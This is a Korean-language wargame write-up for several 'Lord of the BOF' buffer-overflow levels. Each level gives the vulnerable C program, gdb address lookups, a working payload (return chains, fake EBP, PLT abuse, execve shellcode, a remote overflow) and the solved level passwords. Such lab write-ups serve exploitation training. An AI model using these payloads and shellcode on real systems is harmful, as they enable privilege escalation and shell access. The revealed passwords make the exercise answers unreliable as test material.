[giant@localhost giant]$ cat assassin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - assassin
        - no stack, no RTL
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] == '\xbf')
	{
		printf("stack retbayed you!\n");
		exit(0);
	}

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer+sfp hunter
        memset(buffer, 0, 44);
}
```

### Solution

library로 점프하지 못하기 때문에 다른 방법을 사용해야한다. 쉽게 생각해보자. 첫번째 ret을 통해 다시한번 ret을 실행할 수 있는 위치로 점프한다고 생각해보자. 그러면 두번째 ret은 ret주소를 넣어준 다음 위치의 값으로 점프하게 될 것이다.

``` notepad
낮은 주소
              |   esp   |
-------------------------
first ret     |  &ret   |
-------------------------
second ret    | &system |
-------------------------
systemret     | dummy   |
-------------------------
system argv1  | &/bin/sh|
-------------------------
높은 주소
```

이런 식으로 스택을 구성하게 된다면 체크하는 처음 점프하는 영역이 stack, library 영역이 아니면서 system("/bin/sh")를 실행할 수 있다.

/bin/sh 주소는 이전 문제와 마찬가지로 찾았다.

필요한 주소를 찾으면 다음과 같다.

``` bash2
0x400fbff9 = /bin/sh
(gdb) print system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
0x804851e <main+174>:	ret
```

payload는 다음과 같다.
"A" * 44 (dummy) + ret 주소 + system 주소 + "AAAA" + /bin/sh 주소

/home/giant/assassin `python -c 'print "A"*44+"\x1e\x85\x04\x08"+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`

``` bash2
[giant@localhost giant]$ /home/giant/assassin `python -c 'print "A"*44+"\x1e\x85\x04\x08"+"\xe0\x8a\x05\x40"+"AAAA"+"\xf9\xbf\x0f\x40"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??@AAAA廈@
bash$ id
uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
bash$ my-pass
euid = 515
pushing me away
```

# assassin

password is pushing me away

### Problem

``` bash2

[assassin@localhost assassin]$ cat zombie_assassin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - zombie_assassin
        - FEBP
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] == '\xbf')
	{
		printf("stack retbayed you!\n");
		exit(0);
	}

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

	// strncpy instead of strcpy!
	strncpy(buffer, argv[1], 48);
	printf("%s\n", buffer);
}
```

### Solution

이전 문제는 ret로 점프했다면 이 문제는 leave 로 점프하여 변화된 EBP를 이용하는 문제이다.

``` notepad
              |   esp   |   ebp   |   eip  |
--------------------------------------------
leave         |  정상   |   변조   |  정상  |
--------------------------------------------
ret           |  정상   |   변조   | &leave |
--------------------------------------------
leave         | 변조+4  |  [변조]  |  &ret  |
--------------------------------------------
ret           | 변조+8  |  [변조]  |[변조+4]|
--------------------------------------------
각 명령어가 끝난 뒤 레지스터의 상태이다 정상은 bof가 일어나지 않았을 경우와 같다는 것을 의미한다.
```

따라서 [변조+4]가 system 주소이고, [변조+8+4]이 /bin/sh 주소이면 마지막 ret에 의해 system("/bin/sh")가 실행된다.

필요 주소 : system, /bin/sh, leave 주소

``` bash2
(gdb) print system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>

0x400fbff9 = /bin/sh

0x80484df <main+159>:	leave  
0x80484e0 <main+160>:	ret
```

payload = system 주소 + "A"*4 + /bin/sh 주소 + "A"*28 + FEBP(payload 시작주소 - 4) + leave 주소

`python -c 'print "\xe0\x8a\x05\x40" + "A"*4 + "\xf9\xbf\x0f\x40" + "A"*28 + "BBBB" + "\xdf\x84\x04\x08"'`

을 통해 먼저 gdb로 BBBB에 해당하는 FEBP 값을 알아낼 것이다.

``` gdb
(gdb) x/4wx $ebp-40
0xbffffa80:	0x40058ae0	0x41414141	0x400fbff9	0x41414141
```

FEBP = 0xbffffa7c 이다.

~/zombie_assassi2 `python -c 'print "\xe0\x8a\x05\x40" + "A"*4 + "\xf9\xbf\x0f\x40" + "A"*28 + "\x7c\xfa\xff\xbf" + "\xdf\x84\x04\x08"'`

core를 얻어 진짜 payload의 주소를 구해 FEBP를 수정하면 쉘을 얻을 수 있다.

``` gdb
(gdb) x/4wx 0xbffffa60
0xbffffa60:	0x40058ae0	0x41414141	0x400fbff9	0x41414141
```

payload의 주소는 0xbffffa60 이고 FEBP는 0xbfffa5c가 되어야 한다.
~/zombie_assassi2 `python -c 'print "\xe0\x8a\x05\x40" + "A"*4 + "\xf9\xbf\x0f\x40" + "A"*28 + "\x5c\xfa\xff\xbf" + "\xdf\x84\x04\x08"'`

``` bash2
[assassin@localhost assassin]$ ~/zombie_assassi2 `python -c 'print "\xe0\x8a\x05\x40" + "A"*4 + "\xf9\xbf\x0f\x40" + "A"*28 + "\x5c\xfa\xff\xbf" + "\xdf\x84\x04\x08"'`
?@AAAA廈@AAAAAAAAAAAAAAAAAAAAAAAAAAAA\?욀?
bash$ exit  
exit
Segmentation fault (core dumped)
[assassin@localhost assassin]$ ~/zombie_assassin `python -c 'print "\xe0\x8a\x05\x40" + "A"*4 + "\xf9\xbf\x0f\x40" + "A"*28 + "\x5c\xfa\xff\xbf" + "\xdf\x84\x04\x08"'`
?@AAAA廈@AAAAAAAAAAAAAAAAAAAAAAAAAAAA\?욀?
bash$ id    
uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)
bash$ my-pass
euid = 516
no place to hide
```

# zombie_assassin

password is no place to hide

### Problem

``` bash2
[zombie_assassin@localhost zombie_assassin]$ cat succubus.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - succubus
        - calling functions continuously
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

// the inspector
int check = 0;

void MO(char *cmd)
{
        if(check != 4)
                exit(0);

        printf("welcome to the MO!\n");

	// olleh!
	system(cmd);
}

void YUT(void)
{
        if(check != 3)
                exit(0);

        printf("welcome to the YUT!\n");
        check = 4;
}

void GUL(void)
{
        if(check != 2)
                exit(0);

        printf("welcome to the GUL!\n");
        check = 3;
}

void GYE(void)
{
	if(check != 1)
		exit(0);

	printf("welcome to the GYE!\n");
	check = 2;
}

void DO(void)
{
	printf("welcome to the DO!\n");
	check = 1;
}

main(int argc, char *argv[])
{
	char buffer[40];
	char *addr;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// you cannot use library
	if(strchr(argv[1], '\x40')){
		printf("You cannot use library\n");
		exit(0);
	}

	// check address
	addr = (char *)&DO;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with DO\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // stack destroyer
	// 100 : extra space for copied argv[1]
        memset(buffer, 0, 44);
	memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));

	// LD_* eraser
	// 40 : extra space for memset function
	memset(buffer-3000, 0, 3000-40);
}
```

### Solution

DO, GYE, GUL, YUT, MO를 순서대로 호출되게 진행하고 MO의 첫번째 인자를 조작하여 쉘을 얻어야한다.

삭제되는 메모리 영역은 다음과 같다.

ebp -   40 ~ ebp + 4    // memset(buffer, 0, 44);
ebp +  108 ~ 0xbfffffff // memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));
ebp - 3040 ~ ebp - 80

즉 우리가 사용할 수 있는 메모리 영역은 ebp+4 ~ ebp+108 이다.

``` gdb
(gdb) print DO
$1 = {<text variable, no debug info>} 0x80487ec <DO>
(gdb) print GYE
$2 = {<text variable, no debug info>} 0x80487bc <GYE>
(gdb) print GUL
$3 = {<text variable, no debug info>} 0x804878c <GUL>
(gdb) print YUT
$4 = {<text variable, no debug info>} 0x804875c <YUT>
(gdb) print MO
$5 = {<text variable, no debug info>} 0x8048724 <MO>
0x400fbff9 = /bin/sh
```

payload = "A"*44 + DO 주소 + GYE 주소 + GUL 주소 + YUT 주소 + MO 주소 + "AAAA" + /bin/sh 주소

~/succubus `python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "AAAA" + "\xf9\xbf\x0f\x40"'`

하지만 /bin/sh 주소를 넣어주기 위해 0x400fbff9를 사용한다면 You cannot use library 라는 에러 메시지와 함께 종료된다. 이를 해결하기 위해 argv[1] 끝에 /bin/sh를 붙여 이용하자. argv[1]에서의 주소를 구해봤자 어차피 삭제되기 때문에 buffer에 남는 주소를 구해야한다.

``` gdb
Starting program: /home/zombie_assassin/succubu2 `python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "AAAA" + "BBBB" + "/bin/sh"'`

(gdb) x/s $ebp-40
0xbffffa30:	 'A' <repeats 44 times>, "?207\004\b?207\004\b\214\207\004\b\\\207\004\b$\207\004\bAAAABBBB/bin/sh"
(gdb) x/s $ebp-40+72
0xbffffa78:	 "/bin/sh"
```
~/succubu2 `python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "AAAA" + "\x78\xfa\xff\xbf"+"/bin/sh"'`

core를 이용해 다시 /bin/sh의 주소를 구하면

``` gdb
(gdb) x/s 0xbffffa58
0xbffffa58:	 "/bin/sh"
```

~/succubu2 `python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "AAAA" + "\x58\xfa\xff\xbf"+"/bin/sh"'`

``` bash2
[zombie_assassin@localhost zombie_assassin]$ ~/succubu2 `python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "AAAA" + "\x58\xfa\xff\xbf"+"/bin/sh"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?펶??\?$?AAAAX??bin/sh
welcome to the DO!
welcome to the GYE!
welcome to the GUL!
welcome to the YUT!
welcome to the MO!
bash$ exit
exit
Segmentation fault (core dumped)
[zombie_assassin@localhost zombie_assassin]$ ~/succubus `python -c 'print "A"*44 + "\xec\x87\x04\x08" + "\xbc\x87\x04\x08" + "\x8c\x87\x04\x08" + "\x5c\x87\x04\x08" + "\x24\x87\x04\x08" + "AAAA" + "\x58\xfa\xff\xbf"+"/bin/sh"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?펶??\?$?AAAAX??bin/sh
welcome to the DO!
welcome to the GYE!
welcome to the GUL!
welcome to the YUT!
welcome to the MO!
bash$ id
uid=516(zombie_assassin) gid=516(zombie_assassin) euid=517(succubus) egid=517(succubus) groups=516(zombie_assassin)
bash$ my-pass
euid = 517
here to stay
```

# succubus

password is here to stay

### Problem

``` bash2
[succubus@localhost succubus]$ cat nightmare.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - nightmare
        - PLT
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dumpcode.h>

main(int argc, char *argv[])
{
	char buffer[40];
	char *addr;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// check address
	addr = (char *)&strcpy;
        if(memcmp(argv[1]+44, &addr, 4) != 0){
                printf("You must fall in love with strcpy()\n");
                exit(0);
        }

        // overflow!
        strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

	// dangerous waterfall
	memset(buffer+40+8, 'A', 4);
}
```

### Solution

첫 리턴은 strcpy로 고정되어 있고 strcpy의 ret는 "AAAA"로 변환되어 있다.

이를 첫 리턴인 strcpy를 이용해서 strcpy의 ret을 system으로 만들고 system의 인자를 /bin/sh로 바꾸면 된다.

``` notepad
               |    mean    |   value   |
-------------------------
buffer + 44    |  first ret |  strcpy 고정
-----------------------------------------
buffer + 48    | second ret | AAAA -> system
-----------------------------------------
buffer + 52    |strcpy 인자1| buffer+48
-----------------------------------------
buffer + 56    |strcpy 인자2| buffer  --> system 인자1 /bin/sh 주소
-----------------------------------------
```

strcpy(buffer+48, buffer) 가 실행되고 buffer+48은 system 주소로 buffer+56이 /bin/sh 주소로 바뀌기 위해서 argv[1]은 다음과 같이 구성해야한다.

system 주소 + "AAAA" + /bin/sh 주소 + "A"*32 + strcpy 주소 + "AAAA" + (buffer+48) 주소 + buffer 주소

이렇게 payload를 구성하면 strcpy(buffer+48, buffer) -> system("/bin/sh") 의 순서로 프로그램이 진행될 것이다.

필요한 주소는 다음과 같다.

``` gdb
(gdb) print system
$1 = {<text variable, no debug info>} 0x40058ae0 <__libc_system>
(gdb) print strcpy
$2 = {char *(char *, char *)} 0x400767b0 <strcpy>

0x400fbff9 = /bin/sh
```

`python -c 'print "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40" + "A"*32 + "\xb0\x67\x07\x40" + "AAAA" + "CCCC" + "CCCC"'`

이렇게 gdb를 실행하면 You must fall in love with strcpy() 에러 메시지를 출력하고 종료된다. 이를 해결하기 위해 memcmp 에 BP를 걸고 테스트해보면 strcpy의 주소가 0x400767b0이 아닌 0x08048410임을 확인할 수 있다. 이는 PLT, GOT 개념의 strcpy 주소이다. 자세한 plt, got 개념 설명은 생략하겠다.

``` gdb
(gdb) x/3i 0x08048410
0x8048410 <strcpy>:	jmp    *0x8049878
0x8048416 <strcpy+6>:	push   $0x40
0x804841b <strcpy+11>:	jmp    0x8048380 <_init+48>
```

즉 strcpy@plt 는 0x8048410이고 got는 0x08049878이다. strcpy를 처음 실행할때 *0x08049878 = 0x08048416일 것이며 한번 실행된 뒤에는 *0x08049878 = 0x400767b0이 될 것이다.

payload를 수정하면

`python -c 'print "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40" + "A"*32 + "\x10\x84\x04\x08" + "AAAA" + "CCCC" + "CCCC"'` 이고 이를 통해 buffer의 주소를 구하면

``` gdb
(gdb) x/8wx $ebp-40
0xbffffa80:	0x40058ae0	0x41414141	0x400fbff9	0x41414141
0xbffffa90:	0x41414141	0x41414141	0x41414141	0x41414141
```

buffer 주소는 0xbffffa80이다. 따라서 최종적으로 만들어진 payload는 다음과 같다.

`python -c 'print "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40" + "A"*32 + "\x10\x84\x04\x08" + "AAAA" + "\xb0\xfa\xff\xbf" + "\x80\xfa\xff\xbf"'`

이를 통해 core를 얻고 gdb를 이용해 buffer의 주소를 수정하여 넣어주면 쉘을 얻을 수 있다.

``` gdb
(gdb) x/8wx 0xbffffa60
0xbffffa60:	0xbffffaa0	0x00000041	0x00000004	0x08048410
0xbffffa70:	0x40058ae0	0x41414141	0x400fbff9	0x41414141
```

buffer의 주소는 0xbffffa70이다.

`python -c 'print "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40" + "A"*32 + "\x10\x84\x04\x08" + "AAAA" + "\xa0\xfa\xff\xbf" + "\x70\xfa\xff\xbf"'`

``` bash2
[succubus@localhost succubus]$ ~/nightmar2 `python -c 'print "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40" + "A"*32 + "\x10\x84\x04\x08" + "AAAA" + "\xa0\xfa\xff\xbf" + "\x70\xfa\xff\xbf"'`
?@AAAA廈@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?AAAA??퓈?
bash$ exit   
exit
Segmentation fault (core dumped)
[succubus@localhost succubus]$ ~/nightmare `python -c 'print "\xe0\x8a\x05\x40" + "AAAA" + "\xf9\xbf\x0f\x40" + "A"*32 + "\x10\x84\x04\x08" + "AAAA" + "\xa0\xfa\xff\xbf" + "\x70\xfa\xff\xbf"'`
?@AAAA廈@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?AAAA??퓈?
bash$ id    
uid=517(succubus) gid=517(succubus) euid=518(nightmare) egid=518(nightmare) groups=517(succubus)
bash$ my-pass
euid = 518
beg for me
```

# nightmare

password is beg for me

### Problem

``` bash2
[nightmare@localhost nightmare]$ cat xavius.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - xavius
        - arg
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

main()
{
	char buffer[40];
	char *ret_addr;

	// overflow!
	fgets(buffer, 256, stdin);
	printf("%s\n", buffer);

	if(*(buffer+47) == '\xbf')
	{
		printf("stack retbayed you!\n");
		exit(0);
	}

	if(*(buffer+47) == '\x08')
        {
                printf("binary image retbayed you, too!!\n");
                exit(0);
        }

	// check if the ret_addr is library function or not
	memcpy(&ret_addr, buffer+44, 4);
	while(memcmp(ret_addr, "\x90\x90", 2) != 0)	// end point of function
	{
		if(*ret_addr == '\xc9'){		// leaved
			if(*(ret_addr+1) == '\xc3'){	// ret
				printf("You cannot use library function!\n");
				exit(0);
			}
		}
		ret_addr++;
	}

        // stack destroyer
        memset(buffer, 0, 44);
	memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));

	// LD_* eraser
	// 40 : extra space for memset function
	memset(buffer-3000, 0, 3000-40);
}
```

지워지는 영역은 다음과 같다.
buffer ~ buffer + 44
buffer + 48 ~ end of stack
buffer-3000 ~ buffer-40

남는 영역 : buffer-40 ~ buffer, buffer + 44 ~ buffer+48 (ret_addr)

``` bash2
[nightmare@localhost nightmare]$ (python -c 'print "B"*48') | strace ./xaviu2

execve("./xaviu2", ["./xaviu2"], [/* 23 vars */]) = 0
brk(0)                                  = 0x8049a58
old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40014000
open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=12210, ...}) = 0
old_mmap(NULL, 12210, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40015000
close(3)                                = 0
open("/lib/libc.so.6", O_RDONLY)        = 3
fstat(3, {st_mode=S_IFREG|0755, st_size=4101324, ...}) = 0
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\210\212"..., 4096) = 4096
old_mmap(NULL, 1001564, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x40018000
mprotect(0x40105000, 30812, PROT_NONE)  = 0
old_mmap(0x40105000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0xec000) = 0x40105000
old_mmap(0x40109000, 14428, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x40109000
close(3)                                = 0
mprotect(0x40018000, 970752, PROT_READ|PROT_WRITE) = 0
mprotect(0x40018000, 970752, PROT_READ|PROT_EXEC) = 0
munmap(0x40015000, 12210)               = 0
personality(PER_LINUX)                  = 0
getpid()                                = 17675
fstat64(0, 0xbffff974)                  = -1 ENOSYS (Function not implemented)
fstat(0, {st_mode=S_IFIFO|0600, st_size=49, ...}) = 0
old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000
read(0, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"..., 4096) = 49
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40016000
ioctl(1, TCGETS, {B9600 opost isig icanon echo ...}) = 0
write(1, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"..., 49BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
) = 49
write(1, "\n", 1
)                       = 1
--- SIGSEGV (Segmentation fault) ---
```

0x40015000에 read함수가 사용되는 것을 볼 수 있다. 이는 fgets가 임시 버퍼를 두는 공간이라고 한다.

이 문제에서 libc 영역에 뛰는 것은 방지했지만 40xxxxxx 영역에 뛰는 것 자체를 막은 것은 아니다.
또한

``` gdb
40014000-40017000 rw-p 00000000 00:00 0
```

gdb에서 해당 프로세스의 메모리 맵을 봤을때 실행권한이 없다고 표시된다. 하지만 직접 테스트해보면

``` gdb
(gdb) x/s 0x40015000
0x40015000:	 '\220' <repeats 48 times>, "\n"
(gdb) set $eip=0x40015000
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x40016000 in ?? ()
```

실행이 되는 모습을 볼 수 있다.

즉 maps에 표시되는 메모리 권한이 잘못되었음을 알 수 있다.

이를 이용해서 문제를 해결하자.

payload는 다음과 같다.

NOP * 19 + shellcode 25byte + 0x40015001 주소 (ret, NULL 제외)

"\x90" * 19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x01\x50\x01\x40"

``` bash2
[nightmare@localhost nightmare]$ (python -c 'print "\x90" * 19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\x01\x50\x01\x40"';cat) | /home/nightmare/xavius
???????????????????1픐h//shh/bin??S??柰
                                         ?P@

id
uid=518(nightmare) gid=518(nightmare) euid=519(xavius) egid=519(xavius) groups=518(nightmare)
my-pass
euid = 519
throw me away
```

# xavius

password is throw me away

### Problem

``` bash2
[xavius@localhost xavius]$ cat death_knight.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - dark knight
        - remote BOF
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <dumpcode.h>

main()
{
	char buffer[40];

	int server_fd, client_fd;  
	struct sockaddr_in server_addr;   
	struct sockaddr_in client_addr;
	int sin_size;

	if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
		perror("socket");
		exit(1);
	}

	server_addr.sin_family = AF_INET;        
	server_addr.sin_port = htons(6666);   
	server_addr.sin_addr.s_addr = INADDR_ANY;
	bzero(&(server_addr.sin_zero), 8);   

	if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){
		perror("bind");
		exit(1);
	}

	if(listen(server_fd, 10) == -1){
		perror("listen");
		exit(1);
	}

	while(1) {  
		sin_size = sizeof(struct sockaddr_in);
		if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
			perror("accept");
			continue;
		}

		if (!fork()){
			send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
			send(client_fd, "You : ", 6, 0);
			recv(client_fd, buffer, 256, 0);
			close(client_fd);
			break;
		}

		close(client_fd);  
		while(waitpid(-1,NULL,WNOHANG) > 0);
	}
	close(server_fd);
}
```

### Solution

간단한 bof를 remote로 하는 것이다.

``` gdb
0x8048a05 <main+321>:	push   0
0x8048a07 <main+323>:	push   0x100
0x8048a0c <main+328>:	lea    %eax,[%ebp-40]
0x8048a0f <main+331>:	push   %eax
0x8048a10 <main+332>:	mov    %eax,DWORD PTR [%ebp-48]
0x8048a13 <main+335>:	push   %eax
0x8048a14 <main+336>:	call   0x804860c <recv>
```

my-pass를 실행하도록 쉘코드를 짜서 넣어도 의미가 없다. 왜냐하면 바이너리에서 my-pass를 실행한 결과는 해당 바이너리의 1번 fd로 출력될 뿐 나에게 돌아오지 않는다. 따라서 /tmp//sh를 실행하도록 하고 /tmp//sh에는 쉘 스크립트로 my-pass 결과를 /tmp/passwd에 쓰도록 했다.

리모트 환경이기 때문에 내가 넣은 쉘코드의 주소가 고정되어 있을 뿐 알아낼 수 없다. 이를 알아내기 위해 ret 되는 주소를 바꿔가면서 여러번 테스트하면 맞출 수 있다.

``` bash2
#!/bin/bash
my-pass > /tmp/passwd
chmod 644 /tmp/passwd
```

Clear!!!!
